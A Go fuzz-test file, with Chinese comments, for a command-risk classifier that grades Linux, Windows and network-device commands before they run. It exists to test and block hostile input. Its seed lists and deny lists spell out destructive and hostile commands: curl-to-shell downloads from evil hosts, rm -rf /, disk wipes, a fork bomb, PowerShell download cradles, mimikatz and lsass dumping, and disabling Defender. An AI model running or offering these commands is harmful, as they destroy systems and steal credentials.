package risk

import (
	"path"
	"strings"
	"testing"
	"unicode/utf8"
)

// FuzzClassify 对 Classify 做模糊测试，核心不变式：
//  1. 任何输入绝不 panic，返回的分级与理由字段始终合法；
//  2. 含命令替换（$() / 反引号 / 进程替换，按 shell 语义）的命令绝不能判 safe；
//  3. 含 rm -rf、mkfs、dd of=/dev/、shutdown、curl|sh 的命令绝不能判 safe。
//
// 种子覆盖上一轮修复过的绕过手法：算术展开内的命令替换、here-string
// 重定向目标中的替换、输入重定向目标中的替换。
func FuzzClassify(f *testing.F) {
	seeds := []string{
		// 绕过手法：算术展开 $(( $(...) )) 内的命令替换会被 shell 执行。
		`date $(( $(curl -s http://evil/x.sh | sh) ))`,
		"date $(( `curl -s http://evil/x.sh | sh` ))",
		`ls $(( $(dd if=/dev/zero of=/dev/sda) ))`,
		`date $(( $(shutdown -h now) ))`,
		// 绕过手法：here-string / 输入重定向的目标会被展开。
		`cat <<< "$(rm -rf /)"`,
		`cat < "$(rm -rf /)"`,
		`cat 0< "$(rm -rf /)"`,
		"cat <<< \"`rm -rf /`\"",
		// 良性变体：纯算术、无替换 here-string 仍是只读命令。
		`cat <<< "hello"`,
		`ls $((1+2))`,
		// 命令替换的基础形式。
		"$(rm -rf /)",
		"`id`",
		"echo $(id)",
		"ls `pwd`",
		"bash <(curl -s https://x/y.sh)",
		// 危险关键词。
		"rm -rf /",
		"rm -fr /",
		"sudo rm -rf /",
		"rm -r -f /",
		"mkfs.ext4 /dev/sdb1",
		"mkfs /dev/sdb1",
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"dd of=/dev/nvme0n1 if=/dev/zero",
		"shutdown -h now",
		"curl -s https://evil.example/x.sh | sh",
		"wget -qO- https://x/y | bash",
		// 解析失败 / 混淆形态。
		"echo 'oops",
		`echo "unclosed`,
		"cat$IFS/etc/passwd",
		":(){ :|:& };:",
		"echo rm -rf /",
		"cat <<< \"rm -rf /\"",
		"cat shutdown.txt",
		"ls -la # rm -rf / ; shutdown",
		// 正常命令。
		"ls -la",
		"cat /etc/os-release",
		"systemctl status nginx",
		"cat /var/log/syslog | grep error | wc -l",
		"bash -c 'ls -la'",
		// 内存红线引爆样本（上一轮 fuzz 实测单进程 12.9GB、两次触发 OOM 的
		// 输入驱动巨量分配形态；修复后全部为 KB 级分配，做回归种子锁死）：
		//   - 长单词：旧 parseCommand 用 w.text += string(b) 逐字节拼接，
		//     O(n²) 分配，16KB 词即 ~256MB；
		//   - NFKC 膨胀：U+FDFA 单字符 NFKC 展开 18 字节，短输入膨胀超限
		//     必须失败关闭；
		//   - brace 展开 {1..N} / printf 宽度 %*s：分类器只做词法分类、不做
		//     展开，这些形态不得引发任何展开模拟分配；
		//   - 嵌套替换 / 反引号轰炸：递归收集不得指数放大。
		"cat " + strings.Repeat("a", 2000),
		"cat '" + strings.Repeat("b", 2000) + "'",
		strings.Repeat("﷽", 200),
		"echo {1..2147483647}",
		"echo {a..z}{1..99999999}",
		"printf '%*s' 2147483647 x",
		"printf '%2147483647d' 1",
		"$(" + strings.Repeat("a$(", 60) + "id" + strings.Repeat(")", 60) + ")",
		strings.Repeat("`id`;", 100),
		"rm -rf /" + strings.Repeat("*?", 50),
		// 挂起引爆样本：readRedirectTarget 零消费返回使 parseCommand 游标
		// 原地踏步，7 字节输入即可把分类器挂死（fuzz 实测 worker 卡死、
		// 宿主进程被 OOM 杀死）；修复后失败关闭为 OBFUSCATION。
		"&>>>0..",
		"&>&",
		"0&>",
		">&>",
		"0&>&1",
		// 算术空体绕过：内层 $(()) 是空命令替换，曾被当纯算术漏判 safe。
		"ls $(($(())))",
		"ls $(())",
		"echo $(($(())))",
		// 良性嵌套纯算术：不得因检测器边界截断而误报（保持 safe）。
		"ls $(($((0))))",
		"ls $(( (1+2)*$((3)) ))",
		// 算术体非法回退为命令替换的形态（bash 会执行内部内容）。
		"ls $(($(())))",
		"ls $(()$((0)))",
		// 无命令词段：替换在重定向目标位置被求值执行。
		"<`id`",
		`<<< "$(id)"`,
		// 纯赋值段：赋值右侧的替换会被求值执行。
		"A=`pwd`",
		`B="$(id)"`,
		// 嵌套空括号算术体：bash 算术语法错误回退命令替换。
		"ls $((<()))",
		"ls $(( ( ) ))",
		// 算术状态机：缺左操作数回退；合法算术保持 safe。
		"ls $((<((0))))",
		"ls $((16#ff))",
		"ls $(($x))",
		// 空字符串首词：替换仍被求值。
		"'' `id`",
		// 合法算术：比较符右侧嵌套括号不是进程替换（防检测器误报）。
		"ls $((0<((0))))",
		// fd 复用目标藏危险词：<& 后非数字是 bash 歧义错误，失败关闭。
		"cat<&rm -rf",
		// 重定向目标词不得被 path.Base 误提取为命令名（检测器误报修复
		// 回归，fuzz 实测 minimize 出 "cat</rm -rf"）：cat</rm -rf 的真实
		// 语义是 cat 读文件 /rm（< 目标），-rf 是 cat 参数，无 rm 执行。
		"cat</rm -rf",
		"cat </bin/rm -rf",
		"cat 0< /rm",
		"echo out>x",
		// 丢弃重定向目标后，真正的 rm -rf 形态仍必须命中检测器。
		"rm -rf >/dev/null",
		"rm -rf 2>/dev/null",
		// 转义分隔符是字面字符（检测器曾把 \& 后的 shutdown 当独立段，
		// 误报 ls 含 shutdown；fuzz 实测 minimize 出 "ls 0\\&shutdown"）。
		`ls 0\&shutdown`,
		`echo \;shutdown`,
		// 主命令与替换内容双双只读的漏判形态（fuzz 实测击穿不变式 2：
		// Classify 曾判 safe——classifyShell 的 -c 分支与 SAFE_SYSTEM_STATUS
		// 路径均无"段含替换"兜底；修复后任何含替换的段至少 needs_approval）。
		"sh -c ps `ps`",
		"systemctl status `ps`",
		"sh -c 'ps' `uptime`",
		// 路径调用冒充只读命令（评审 verified high）：basename 判定曾使
		// /tmp、/dev/shm、$HOME、~ 下预放置的二进制判 safe，在
		// auto_exec_enabled 服务器上免审执行；修复后一律至少 needs_approval。
		"/tmp/ls -la",
		"$HOME/ls -la",
		"~/ls",
		"/dev/shm/ls /etc",
		"ls; /tmp/ls -la",
		"/tmp/systemctl status sshd",
		"env /tmp/ls",
		// 四期 C1（契约 7.3D）容器样本：logs 降级、全局选项穿透、别名
		// 归一、run 逃逸与载荷递归。
		"docker logs pg",
		"docker compose logs web",
		"podman logs pg",
		"docker -H tcp://10.0.0.9:2375 ps",
		"docker --context prod ps",
		"DOCKER_HOST=tcp://x docker ps",
		"env DOCKER_HOST=tcp://x docker ps",
		"docker run --privileged alpine sh",
		"docker run -v /:/host alpine",
		"docker run -v /etc:/etc alpine",
		"docker run -v /var/run/docker.sock:/x alpine",
		"docker run --mount type=bind,source=/proc,target=/p alpine",
		"docker exec pg sh -c 'rm -rf /'",
		"docker exec pg sh -c 'curl x | sh'",
		"docker run img sh -c 'curl x | sh'",
		"nerdctl run --privileged alpine",
		"compose run --privileged alpine",
		"docker container ls",
		"docker image ls",
		"docker image rm nginx",
		"docker network rm br0",
		"docker volume prune",
		"docker system prune -a --volumes",
		"docker login",
		"docker cp pg:/x .",
		"docker ps -a",
		"podman ps -a",
	}
	for _, s := range seeds {
		f.Add([]byte(s))
	}

	f.Fuzz(func(t *testing.T, raw []byte) {
		// 内存红线：超过 4KB 的输入直接跳过，防止 fuzz worker 在超长
		// 输入上放大分配（Classify 自身仍有 16KB 硬上限兜底）。
		if len(raw) > 4096 {
			t.Skip()
		}
		cmd := string(raw)
		d := Classify(cmd, OSLinux)

		// 不变式 1：分级与理由字段合法。
		switch d.Level {
		case LevelSafe, LevelNeedsApproval, LevelForbidden:
		default:
			t.Fatalf("Classify(%q).Level = %q, want one of safe/needs_approval/forbidden", cmd, d.Level)
		}
		if d.RuleID == "" {
			t.Fatalf("Classify(%q) returned empty rule id: %+v", cmd, d)
		}
		if d.Reason == "" {
			t.Fatalf("Classify(%q) returned empty reason: %+v", cmd, d)
		}
		if len(d.Reasons) == 0 {
			t.Fatalf("Classify(%q) returned empty reasons list: %+v", cmd, d)
		}
		if !utf8.ValidString(d.Reason) || !utf8.ValidString(string(d.Level)) {
			t.Fatalf("Classify(%q) returned invalid utf-8 fields: %+v", cmd, d)
		}

		// 非 safe 判定天然满足后续不变式。
		if d.Level != LevelSafe {
			return
		}

		// 不变式 2：含命令替换的命令绝不能 safe。
		// 在 Normalized（已完成 NFKC、切除注释）上按 shell 引号语义检测。
		if hasShellCommandSubstitution(d.Normalized) {
			t.Fatalf("Classify(%q) = safe, but normalized %q contains command substitution", cmd, d.Normalized)
		}

		// 不变式 3：危险命令绝不能 safe。
		if danger := dangerousCommand(d.Normalized); danger != "" {
			t.Fatalf("Classify(%q) = safe, but normalized %q contains dangerous command %q", cmd, d.Normalized, danger)
		}
	})
}

// ---------------------------------------------------------------------------
// 独立检测器：只依赖 Decision.Normalized 的 shell 文本语义，不复用被测的
// parseCommand/classify* 逻辑，避免实现缺陷传导到不变式。
// ---------------------------------------------------------------------------

// hasShellCommandSubstitution 判断规范化命令中是否存在会被 shell 执行的
// 命令替换：未括在单引号内的 $()、反引号、进程替换 <(。
// 纯算术展开 $((1+2)) 不算，但其中的嵌套替换会被递归检查。
func hasShellCommandSubstitution(s string) bool {
	for i := 0; i < len(s); {
		switch s[i] {
		case '\\':
			i += 2
		case '\'':
			j := strings.IndexByte(s[i+1:], '\'')
			if j < 0 {
				return true // 未闭合单引号：Classify 不应判 safe，防御性报告
			}
			i += j + 2
		case '"':
			j := i + 1
			closed := false
			for j < len(s) {
				switch s[j] {
				case '\\':
					j += 2
				case '"':
					closed = true
					j++
				case '`':
					return true
				case '$':
					if j+1 < len(s) && s[j+1] == '(' {
						end, subst := scanArithOrSubst(s, j)
						if subst {
							return true
						}
						j = end
					} else {
						j++
					}
				default:
					j++
				}
				if closed {
					break
				}
			}
			if !closed {
				return true // 未闭合双引号
			}
			i = j
		case '`':
			return true
		case '<':
			if i+1 < len(s) && s[i+1] == '(' {
				return true // 进程替换 <(...) 会派生子 shell 执行
			}
			i++
		case '$':
			if i+1 < len(s) && s[i+1] == '(' {
				end, subst := scanArithOrSubst(s, i)
				if subst {
					return true
				}
				i = end
			} else {
				i++
			}
		default:
			i++
		}
	}
	return false
}

// scanArithOrSubst 处理 s[pos] == '$' 且 s[pos+1] == '(' 的两种形式：
// $((...)) 算术展开递归检查内部是否嵌套命令替换；$(...) 直接就是命令替换。
// 算术体边界用括号计数配对定位——嵌套 $((0)) 产生的 "))" 不是收尾，
// 此前用 strings.Index 找第一个 "))" 会把 body 截断、误报含替换。
// 返回结束下标（已消费到的位置）与是否发现命令替换。
func scanArithOrSubst(s string, pos int) (int, bool) {
	if pos+2 < len(s) && s[pos+2] == '(' {
		depth := 0
		for i := pos + 1; i < len(s); i++ {
			switch s[i] {
			case '(':
				depth++
			case ')':
				depth--
				if depth == 0 {
					// i-1 与 i 是配对收尾的 "))"；算术体为 s[pos+3 : i-1]。
					if i-1 < pos+3 {
						return i + 1, true // 空体：不应出现在 safe 判定中，防御性报告
					}
					if arithBodyHasSubst(s[pos+3 : i-1]) {
						return i + 1, true
					}
					return i + 1, false
				}
			}
		}
		return len(s), true // 未闭合算术展开：不应出现在 safe 判定中
	}
	return pos + 2, true // $(...) 命令替换
}

// arithBodyHasSubst 在算术体上下文中检测命令替换：只认未转义的反引号与
// $( 单括号（嵌套 $(( 递归检查）。算术体内 0<((0)) 的 "<(" 是比较运算符
// 加嵌套括号，不是进程替换，不得按通用 shell 文本规则误报。
func arithBodyHasSubst(b string) bool {
	for i := 0; i < len(b); {
		switch b[i] {
		case '\\':
			i += 2
		case '`':
			return true
		case '$':
			if i+1 < len(b) && b[i+1] == '(' {
				if i+2 < len(b) && b[i+2] == '(' {
					end, subst := scanArithOrSubst(b, i)
					if subst {
						return true
					}
					i = end
					continue
				}
				return true // $(cmd) 命令替换
			}
			i++
		default:
			i++
		}
	}
	return false
}

// stripQuotedLiterals 去掉单引号 / 双引号包围的字面内容，
// 只保留 shell 会当作代码执行的文本（变量、命令、参数）。
func stripQuotedLiterals(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); {
		switch s[i] {
		case '\\':
			if i+1 < len(s) {
				c := s[i+1]
				// 被反斜杠转义的分隔符/重定向符是字面字符（如 ls 0\&shutdown
				// 中 & 属于文件名），不得再参与切段或命令名提取；换成中性
				// 占位，其余转义字符原样保留（fuzz 实测误报回归）。
				switch c {
				case ';', '|', '&', '\n', '<', '>', '`':
					b.WriteByte('_')
				default:
					b.WriteByte(c)
				}
				i += 2
			} else {
				i++
			}
		case '\'':
			j := strings.IndexByte(s[i+1:], '\'')
			if j < 0 {
				i = len(s)
			} else {
				i += j + 2
			}
		case '"':
			j := i + 1
			for j < len(s) {
				if s[j] == '\\' {
					j += 2
					continue
				}
				if s[j] == '"' {
					break
				}
				j++
			}
			i = j + 1
		default:
			b.WriteByte(s[i])
			i++
		}
	}
	return b.String()
}

// segLite 是检测器自用的命令段：命令词与全文（引号字面已剥离）。
type segLite struct {
	words []string
	pipe  bool
}

// splitSegmentsLite 按未引用的 ;、|、&、\n、&&、|| 切分命令段。
//
// < 与 >（重定向操作符）也在词内切开，且其目标 token 被丢弃：重定向目标
// 不是命令词，若留在词表里，effectiveCommand 的 path.Base 会把 "cat</rm"
// 之类的粘连词的目标 "/rm" 误提取成命令名 "rm"（fuzz 实测误报：
// Classify("cat</rm -rf") = safe 被判含 rm -rf，而真实语义是 cat 读文件）。
func splitSegmentsLite(norm string) []segLite {
	stripped := stripQuotedLiterals(norm)
	var segs []segLite
	var cur []string
	pipe := false
	flush := func(nextPipe bool) {
		if len(cur) > 0 {
			segs = append(segs, segLite{words: cur, pipe: pipe})
		}
		cur = nil
		pipe = nextPipe
	}
	dropNext := false // 重定向目标落在下一个词时待丢弃
	for _, w := range strings.FieldsFunc(stripped, func(r rune) bool {
		return r == ' ' || r == '\t' || r == '\r'
	}) {
		// 可能出现粘连的分隔符（剥引号后），按字符切细。
		for len(w) > 0 {
			before, sep, after := cutAnySeparator(w)
			if before != "" && !dropNext {
				cur = append(cur, before)
			}
			dropNext = false
			if sep == "" {
				break
			}
			w = after
			switch sep {
			case "|":
				flush(true)
			case ";", "&", "\n":
				flush(false)
			case "<", ">":
				rest, dropped := dropRedirectTarget(w)
				if dropped {
					w = rest
				} else {
					// 目标在下一个词（如 "cat < /rm"）；若无下一个词则作废。
					dropNext = true
					w = ""
				}
			}
		}
	}
	flush(false)
	return segs
}

// dropRedirectTarget 丢弃 s 开头的重定向目标 token（到下一个 shell
// 分隔符/重定向符或结尾）。返回剩余部分与是否丢弃了 token；s 为空或以
// 分隔符开头（连续符号，目标为空）时不丢弃。
func dropRedirectTarget(s string) (string, bool) {
	if s == "" {
		return s, false
	}
	i := 0
	for i < len(s) {
		switch s[i] {
		case '<', '>', ';', '|', '&', '\n':
			if i == 0 {
				return s, false
			}
			return s[i:], true
		}
		i++
	}
	return "", true
}

// cutAnySeparator 在词内查找第一个 shell 段分隔符（; | & \n）或重定向
// 操作符（< >），返回前缀、分隔符与余部。
func cutAnySeparator(w string) (before, sep, after string) {
	for i := 0; i < len(w); i++ {
		switch w[i] {
		case ';', '|', '&', '\n', '<', '>':
			return w[:i], w[i : i+1], w[i+1:]
		}
	}
	return w, "", ""
}

var wrapperWords = map[string]bool{
	"sudo": true, "env": true, "nohup": true, "setsid": true, "command": true,
	"builtin": true, "exec": true, "timeout": true, "nice": true, "ionice": true,
	"stdbuf": true, "xargs": true, "watch": true, "parallel": true,
}

var shellWords = map[string]bool{
	"bash": true, "sh": true, "zsh": true, "dash": true, "ash": true, "ksh": true,
}

// effectiveCommand 剥离常见包装器与选项词，返回段内真正执行的命令名。
func effectiveCommand(words []string) string {
	i := 0
	for i < len(words) {
		cmd := path.Base(strings.TrimRight(words[i], "/"))
		if !wrapperWords[cmd] {
			return cmd
		}
		i++
		for i < len(words) && strings.HasPrefix(words[i], "-") && words[i] != "-" {
			i++
		}
		// env NAME=value、timeout 5s 之类的包装器参数。
		if i < len(words) && cmd != "xargs" && cmd != "watch" && cmd != "parallel" {
			if strings.Contains(words[i], "=") && !strings.HasPrefix(words[i], "-") {
				i++
			} else if cmd == "timeout" || cmd == "nice" || cmd == "ionice" {
				i++
			}
		}
	}
	if i < len(words) {
		return path.Base(strings.TrimRight(words[i], "/"))
	}
	return ""
}

// dangerousCommand 检测规范化命令中的危险形式，命中时返回描述。
func dangerousCommand(norm string) string {
	return dangerousCommandDepth(norm, 0)
}

func dangerousCommandDepth(norm string, depth int) string {
	if depth > 4 {
		return ""
	}
	segs := splitSegmentsLite(norm)
	for i, seg := range segs {
		cmd := effectiveCommand(seg.words)
		compact := strings.Join(seg.words, "")

		switch {
		case cmd == "rm" && (strings.Contains(compact, "rm-rf") ||
			strings.Contains(compact, "rm-fr") ||
			strings.Contains(compact, "rm-r-f") ||
			strings.Contains(compact, "rm-f-r")):
			return "rm -rf"
		case strings.HasPrefix(cmd, "mkfs"):
			return "mkfs"
		case cmd == "dd" && strings.Contains(compact, "of=/dev/"):
			return "dd of=/dev/"
		case cmd == "shutdown":
			return "shutdown"
		case (cmd == "curl" || cmd == "wget") && seg.pipe && i+1 < len(segs):
			next := effectiveCommand(segs[i+1].words)
			if shellWords[next] {
				return "curl|sh"
			}
		}

		// shell -c / ssh 远端命令携带的脚本递归检查。
		if shellWords[cmd] {
			for j, w := range seg.words {
				if w == "-c" && j+1 < len(seg.words) {
					script := strings.Join(seg.words[j+1:], " ")
					if d := dangerousCommandDepth(script, depth+1); d != "" {
						return d
					}
					break
				}
			}
		}
		if cmd == "ssh" {
			// 跳过选项与 host，其余词视作远端命令。
			rest := seg.words
			k := 0
			for k < len(rest) && strings.HasPrefix(rest[k], "-") {
				k++
			}
			if k < len(rest) {
				script := strings.Join(rest[k+1:], " ")
				if d := dangerousCommandDepth(script, depth+1); d != "" {
					return d
				}
			}
		}
	}
	return ""
}

// ---------------------------------------------------------------------------
// Windows 分册 fuzz（W1）
// ---------------------------------------------------------------------------

// FuzzWinClassify 对 Windows 分册做模糊测试，核心不变式：
//  1. 任何输入绝不 panic，返回的分级与理由字段始终合法；
//  2. 含 PowerShell 子表达式（$(...)）、危险载荷词（DownloadString、
//     FromBase64String、-EncodedCommand、mimikatz 等）的命令绝不能判 safe。
//
// 种子覆盖契约 7.3B 的危险命令与绕过手法（-EncodedCommand、Base64、别名、
// 嵌套 powershell -c、cmd /c 包装、反引号拼接、${} 变量切片）。
//
// 命名注意：不要叫 FuzzClassify*（如 FuzzClassifyWindows）——门禁脚本用
// 无锚点的 `-fuzz FuzzClassify` 跑 Linux 分册，前缀扩展名会让该模式匹配
// 到多个 fuzz 目标，Go 直接拒绝执行（终版复验实测 exit 1）。
func FuzzWinClassify(f *testing.F) {
	seeds := []string{
		// 危险载荷（契约 7.3B forbidden 清单样本）。
		"Remove-Item -Recurse -Force C:\\Windows",
		"rm -Recurse -Force C:\\",
		"rd /s /q C:\\",
		"del /f /s /q C:\\Windows\\System32",
		"format C:",
		"vssadmin delete shadows /all",
		"IEX(New-Object Net.WebClient).DownloadString('http://x')",
		"iex (New-Object Net.WebClient).DownloadString('http://x')",
		"powershell -enc AAAAbBBBcCCC==",
		"powershell -EncodedCommand SQBFAFgA",
		"powershell -e AAAA",
		"powershell -nop -exec bypass -c Get-Process",
		"powershell -w hidden -c Get-Process",
		"Set-MpPreference -DisableRealtimeMonitoring $true",
		"procdump -ma lsass",
		"reg save HKLM\\SAM sam.hive",
		"mimikatz sekurlsa::logonpasswords",
		"Stop-Service WinRM",
		"net stop windefend",
		"Stop-Computer -Force",
		"schtasks /create /tn x /tr cmd.exe",
		// 别名等价表展开（契约 7.3B 补充）。
		"sal gz Get-Content; gz C:\\x",
		"iwr http://x/p.ps1 | iex",
		"curl http://x/p.ps1 | iex",
		// 绕过手法：嵌套 powershell -c、cmd /c、反引号拼接、${} 切片。
		"powershell -Command \"powershell -Command Remove-Item -Recurse C:\\\"",
		"cmd /c del /f C:\\x",
		"i`e`x Get-Process",
		"${e}xpression x",
		"powershell -File C:\\x.ps1",
		"Start-Process cmd.exe",
		"Start-Process -Verb RunAs cmd",
		// needs_approval 样本。
		"Stop-Service Spooler",
		"net user x /add",
		"New-NetFirewallRule -DisplayName x",
		// safe 样本。
		"Get-Service",
		"dir C:\\Users",
		"systeminfo",
		"Get-Process | Sort-Object CPU",
		"tasklist",
		"Get-ChildItem C:\\logs | Measure-Object",
		// 混淆/畸形形态。
		"echo 'oops",
		`echo "unclosed`,
		"Get-Process $((Get-Date).Year)",
		"cat " + strings.Repeat("a", 2000),
		"Remove-Item -Recurse -Force C:\\Windows\\" + strings.Repeat("*?", 40),
		"$(" + strings.Repeat("a$(", 60) + "id" + strings.Repeat(")", 60) + ")",
	}
	for _, s := range seeds {
		f.Add([]byte(s))
	}

	f.Fuzz(func(t *testing.T, raw []byte) {
		if len(raw) > 4096 {
			t.Skip()
		}
		cmd := string(raw)
		d := Classify(cmd, OSWindows)

		switch d.Level {
		case LevelSafe, LevelNeedsApproval, LevelForbidden:
		default:
			t.Fatalf("Classify(%q, windows).Level = %q", cmd, d.Level)
		}
		if d.RuleID == "" || d.Reason == "" || len(d.Reasons) == 0 {
			t.Fatalf("Classify(%q, windows) returned empty fields: %+v", cmd, d)
		}
		if !utf8.ValidString(d.Reason) {
			t.Fatalf("Classify(%q, windows) returned invalid utf-8 reason", cmd)
		}

		if d.Level != LevelSafe {
			return
		}

		// safe 不变式：子表达式与危险载荷词绝不允许出现在 safe 判定中。
		low := strings.ToLower(d.Normalized)
		for _, tok := range []string{
			"downloadstring", "downloaddata", "downloadfile", "frombase64string",
			"encodedcommand", "-enc ", "mimikatz", "procdump", "ntdsutil",
			"secretsdump", "comsvcs.dll", "amsiinitfailed", "amsi.dll",
			"invoke-expression", "stop-service", "stop-computer", "restart-computer",
			"schtasks", "invoke-command", "enter-pssession", "new-pssession",
			"reg save", "certutil", "bitsadmin", "rundll32", "regsvr32", "mshta",
			"wscript", "cscript", "msbuild", "installutil", "format", "diskpart",
			"vssadmin", "bcdedit", "set-mppreference", "clear-history",
			"wevtutil", "stop-process", "taskkill",
		} {
			if strings.Contains(low, tok) {
				t.Fatalf("Classify(%q, windows) = safe, but contains %q", cmd, tok)
			}
		}
		if hasWinSubexpression(d.Normalized) {
			t.Fatalf("Classify(%q, windows) = safe, but contains a subexpression", cmd)
		}
		if strings.Contains(low, "-recurse") || strings.Contains(low, "-force") ||
			strings.Contains(low, "/s /q") || strings.Contains(low, "/f /s") {
			t.Fatalf("Classify(%q, windows) = safe, but contains recursive delete flags", cmd)
		}
	})
}

// hasWinSubexpression 报告未括在单引号内的 $( 子表达式（safe 不变式检测器，
// 与被测实现独立）。
func hasWinSubexpression(s string) bool {
	for i := 0; i < len(s); {
		switch s[i] {
		case '\\':
			i += 2
		case '\'':
			j := strings.IndexByte(s[i+1:], '\'')
			if j < 0 {
				return true
			}
			i += j + 2
		case '"':
			j := i + 1
			closed := false
			for j < len(s) {
				if s[j] == '"' {
					closed = true
					j++
					break
				}
				if s[j] == '$' && j+1 < len(s) && s[j+1] == '(' {
					return true
				}
				j++
			}
			if !closed {
				return true
			}
			i = j
		case '$':
			if i+1 < len(s) && s[i+1] == '(' {
				return true
			}
			i++
		default:
			i++
		}
	}
	return false
}

// FuzzNetClassify 对网络设备分册（7.3C）做模糊测试，核心不变式：
//  1. 任何输入绝不 panic，返回的分级与理由字段始终合法；
//  2. 含 shell 元字符（反引号/$/;/&/< >，含全角变体）的命令绝不能判 safe；
//  3. 危险语义词（reload/reboot/zeroize/write erase/erase startup-config/
//     factory-default/boot system/format flash:）在任何分册绝不能判 safe。
//
// 种子覆盖契约 7.3C 的五分册样本：cisco 缩写归一（sh ver/conf t/wr er/
// eras st/relo/en）、huawei/h3c 显式别名（sy）、junos 别名（conf）、
// 输出过滤修饰符、注入形态与失败关闭输入。
//
// 命名注意：不要叫 FuzzClassify*（同 FuzzWinClassify 头注释——门禁用
// 无锚点 `-fuzz FuzzClassify` 跑 Linux 分册，前缀扩展名会让该模式匹配
// 多个目标）。
func FuzzNetClassify(f *testing.F) {
	seeds := []string{
		// cisco 分册（含唯一前缀缩写绕过样本）。
		"show version",
		"sh ver",
		"show ip interface brief | exclude unassigned",
		"show running-config",
		"show running-config | include password",
		"conf t",
		"enable",
		"en",
		"wri mem",
		"copy running-config tftp:",
		"copy tftp: running-config",
		"monitor capture cap1",
		"reload",
		"relo",
		"write erase",
		"wr er",
		"erase startup-config",
		"eras st",
		"format flash:",
		"boot system flash:x.bin",
		"more flash:backup.cfg",
		// huawei / h3c 分册（显式别名 sy；不支持缩写）。
		"display version",
		"display current-configuration",
		"sy",
		"super 3",
		"save tftp://10.0.0.9/vrpcfg.zip",
		"restore flash:backup.zip",
		"capture interface GigabitEthernet0/0/1",
		"packet-capture",
		"reboot fast",
		"reset saved-configuration",
		"boot-loader flash:/vrpv8.cc",
		"disp ver", // 缩写不归一 → DEFAULT_ASK
		"undo stp enable",
		// junos 分册（别名 conf；无 enable/super）。
		"show chassis hardware",
		"show interfaces terse",
		"show configuration",
		"conf",
		"configure exclusive",
		"commit confirmed 5",
		"rollback 1",
		"load override /var/tmp/x.conf",
		"load factory-default",
		"request system reboot",
		"request system zeroize",
		"set system boot-loader primary",
		"set interfaces xe-0/0/0",
		"exit",
		// generic 并集分册。
		"vlan 10",
		"interface Ten-GigabitEthernet1/0/1",
		"tracert 10.0.0.1",
		// 注入 / 失败关闭形态。
		"reload; show version",
		"show version $(whoami)",
		"`reload`",
		"show version > flash:x",
		"copy tftp: running-config && reload",
		"show version ＄x", // 全角 $ NFKC 归一后命中注入检查
		"\x00reload",
		"",
		// 输出过滤修饰符（| 不是进程管道）。
		"show version | include up",
		"sh ver | inc uptime",
		"show run | section snmp",
	}
	for _, s := range seeds {
		f.Add([]byte(s))
	}

	f.Fuzz(func(t *testing.T, raw []byte) {
		if len(raw) > 4096 {
			t.Skip()
		}
		cmd := string(raw)
		// 五分册逐个跑：同输入在不同分册都不得 panic 且字段合法。
		for _, brand := range []NetBrand{NetBrandCisco, NetBrandHuawei, NetBrandH3C, NetBrandJunos, NetBrandGeneric} {
			d := ClassifyNet(cmd, brand)
			switch d.Level {
			case LevelSafe, LevelNeedsApproval, LevelForbidden:
			default:
				t.Fatalf("ClassifyNet(%q, %s).Level = %q", cmd, brand, d.Level)
			}
			if d.RuleID == "" || d.Reason == "" || len(d.Reasons) == 0 {
				t.Fatalf("ClassifyNet(%q, %s) returned empty fields: %+v", cmd, brand, d)
			}
			if !utf8.ValidString(d.Reason) || !utf8.ValidString(d.Normalized) {
				t.Fatalf("ClassifyNet(%q, %s) returned invalid utf-8 fields", cmd, brand)
			}
			if d.Level != LevelSafe {
				continue
			}
			// safe 不变式：注入元字符不得出现在 safe 判定的任何位置；
			// 危险语义以**首词**判定（缩写归一后首词是完整动词）——
			// `show env capture` 这类只读动词带未知参数的形态无害，
			// 全文 contains 误报。
			low := strings.ToLower(d.Normalized)
			for _, tok := range []string{"`", "$", ";", "&", "<", ">"} {
				if strings.Contains(low, tok) {
					t.Fatalf("ClassifyNet(%q, %s) = safe, but contains %q", cmd, brand, tok)
				}
			}
			first := low
			if i := strings.IndexByte(low, ' '); i >= 0 {
				first = low[:i]
			}
			for _, verb := range []string{
				"reload", "reboot", "zeroize", "write", "erase", "format",
				"boot", "boot-loader", "boot-end-marker", "capture",
				"packet-capture", "monitor", "copy", "configure", "commit",
				"rollback", "load", "restore", "save", "enable", "super",
				"request", "reset", "set", "more", "undo", "delete", "edit",
				"system-view", "tftp:", "ftp:",
			} {
				if first == verb {
					t.Fatalf("ClassifyNet(%q, %s) = safe, but starts with %q", cmd, brand, verb)
				}
			}
			// 只读查看动词后的 dump 子命令绝不允许 safe。
			for _, dump := range []string{
				"running-config", "startup-config", "current-configuration",
				"saved-configuration", "configuration", "log",
			} {
				if strings.HasPrefix(low, "show "+dump+" ") || low == "show "+dump ||
					strings.HasPrefix(low, "display "+dump+" ") || low == "display "+dump {
					t.Fatalf("ClassifyNet(%q, %s) = safe, but dumps %q", cmd, brand, dump)
				}
			}
		}
	})
}
